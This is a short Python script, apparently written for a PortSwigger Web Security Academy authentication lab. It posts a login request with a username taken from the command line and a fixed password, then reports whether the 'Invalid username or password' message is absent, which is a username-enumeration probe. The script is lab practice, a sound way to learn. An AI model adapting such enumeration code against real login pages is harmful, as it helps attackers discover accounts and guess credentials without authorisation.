import requests
import sys

username=sys.argv[1]

# Headers
headers = {
    'Host': '0a9100810434e6a2c0d61c780023006b.web-security-academy.net',
    'Cookie': 'session=AdzemH8HoQWfl6MlbyCRM885yoiHp3C7',
    'Content-Length': '30',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
    'Origin': 'https://0a9100810434e6a2c0d61c780023006b.web-security-academy.net',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept-Language': 'en-US;q=0.7',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Gpc': '1',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://0a9100810434e6a2c0d61c780023006b.web-security-academy.net/login',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
}

# Data
data = "username="+username+"&password=peterpeter"

# Cookies
cookies = {
}

# Prepare and send request
req = requests.Request(
    method='POST',
    url='https://0a9100810434e6a2c0d61c780023006b.web-security-academy.net:443/login',
    headers=headers,
    data=data,
    cookies=cookies,
)
prepared_req = req.prepare()
session = requests.Session()
resp = session.send(prepared_req)
# print(resp.text)
if ("Invalid username or password." in resp.text):
    print("Just invalid creds...")
else:
    print("Heey, error message didn't show up...!!!!")